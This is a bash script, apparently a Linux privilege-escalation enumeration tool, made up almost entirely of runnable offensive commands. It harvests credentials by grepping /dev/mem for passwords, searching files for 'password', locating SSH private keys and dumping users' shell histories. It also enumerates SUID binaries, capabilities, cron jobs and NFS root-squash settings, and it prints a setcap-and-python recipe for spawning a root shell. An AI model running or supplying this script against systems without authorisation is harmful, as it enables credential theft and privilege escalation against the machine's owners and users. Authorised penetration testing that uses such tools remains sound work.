#!/bin/bash

pid=$!

trap_ctrlc() {
    kill $pid
    echo -e "\nkill=$? (0 = success)\n"
    wait $pid
    echo "wait=$? (the exit status from the background process)"
    echo -e "\n\ntrap_ctrlc\n\n"
}

echo 
echo "------------------------"
echo "Sudo executable binaries"
echo "------------------------"
echo
echo "$1" |  sudo -S -l
echo 


echo 
echo "------------------------"
echo "Last edited files"
echo "------------------------"
echo
 
find / -mmin -10 2>/dev/null | grep -Ev "^/proc" 

echo 
echo "------------------------"
echo "In memory passwords"
echo "------------------------"
echo

strings /dev/mem -n10 | grep -i PASS

echo 
echo "------------------------"
echo "Find sensitive files"
echo "------------------------"
echo

locate password

echo 
echo "------------------------"
echo "SSH Key"
echo "------------------------"
echo

find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null


echo 
echo "------------------------"
echo "Cron jobs"
echo "------------------------"
echo



crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*


systemctl list-timers --all

echo 
echo "------------------------"
echo "SUID files"
echo "------------------------"
echo

find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null

echo 
echo "------------------------"
echo "List capabilities of binaries"
echo "------------------------"
echo

getcap -r  /usr/bin
getcap openssl /usr/bin/openssl 

echo
echo "Remember you can edit capabilities with:"
echo "/usr/bin/setcap -r /bin/ping            # remove"
echo "/usr/bin/setcap cap_net_raw+p /bin/ping # add"
echo
echo "Capabilities that can be use to upgrade current privileges"
echo "cap_dac_read_search # read anything"
echo "cap_setuid+ep # setuid"
echo
echo "Example"
echo "$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7"
echo
echo "$ python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
echo "sh-5.0# id"
echo "uid=0(root) gid=1000(swissky)"

echo
echo "------------------------"
echo "NFS Root Squashing"
echo "------------------------"
echo


cat /etc/exports | grep no_root_squash 

echo
echo "------------------------"
echo "Tmux sessions"
echo "------------------------"
echo

tmux ls

echo
echo "------------------------"
echo "Running processes"
echo "------------------------"
echo

ps -faux


echo
echo "------------------------"
echo "Netstat"
echo "------------------------"
echo

netstat -tulpn | grep LISTEN

echo
echo "------------------------"
echo "SS"
echo "------------------------"
echo

ss -tulpn | grep LISTEN


echo
echo "------------------------"
echo "Id and groups"
echo "------------------------"
echo

groups
echo
id

echo
echo "------------------------"
echo "Bash history"
echo "------------------------"
echo

for a in $(find / -name ".*_history" 2> /dev/null | grep "home")
do
	echo "Printing: $a contents"
	cat $a
	echo
done

echo
echo "------------------------"
echo "Files containing passwords"
echo "------------------------"
echo

find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null & sleep 5 ; kill $!